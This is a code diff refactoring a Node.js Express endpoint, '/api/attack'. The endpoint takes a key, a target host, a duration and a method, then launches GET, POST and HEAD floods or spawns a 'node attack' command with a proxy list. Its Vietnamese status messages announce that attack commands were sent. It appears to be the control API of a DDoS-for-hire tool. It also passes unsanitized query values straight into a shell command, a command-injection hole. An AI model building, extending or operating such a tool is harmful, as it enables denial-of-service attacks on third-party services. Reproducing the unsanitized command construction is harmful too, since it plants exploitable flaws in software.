@@ -63,13 +63,15 @@ const executeAllAttacks = (methods, host, time) =>
 app.get("/api/attack", async (req, res) => {
     const { key, host, time, method, port, modul } = req.query;
 
+    const response = (status, message, data = {}) => res.json({ status, message, ...data, serverStatusCode: res.statusCode });
+
     if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
-        return res.json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC" });
+        return response("ERROR", "ĐANG CÓ CUỘC TẤN CÔNG KHÁC");
     }
 
     const validationMessage = validateInput({ key, host, time, method, port });
     if (validationMessage) {
-        return res.json({ status: "ERROR", message: validationMessage });
+        return response("ERROR", validationMessage);
     }
 
     activeAttacks++;
@@ -77,27 +79,19 @@ app.get("/api/attack", async (req, res) => {
     try {
         if (modul === "FULL") {
             executeAllAttacks(["GET", "POST", "HEAD"], host, time);
-            res.json({
-                status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
-                host: host, port: port, time: time, modul: "GET POST HEAD", method: method, pid: currentPID,
-                serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
+            response("SUCCESS", "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", {
+                host, port, time, modul: "GET POST HEAD", method, pid: currentPID
             });
         } else {
             const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
             executeAttack(command, time);
-            res.json({
-                status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI",
-                host: host, port: port, time: time, modul: modul, method: method, pid: currentPID,
-                serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
+            response("SUCCESS", "LỆNH TẤN CÔNG ĐÃ GỬI", {
+                host, port, time, modul, method, pid: currentPID
             });
         }
     } catch (error) {
         console.error("Lỗi khi thực hiện tấn công:", error.message);
-        res.json({
-            status: "ERROR",
-            message: "LỖI KHI THỰC HIỆN TẤN CÔNG",
-            serverStatusCode: res.statusCode // Lấy mã trạng thái từ phản hồi của API hiện tại
-        });
+        response("ERROR", "LỖI KHI THỰC HIỆN TẤN CÔNG");
     }
 });
 
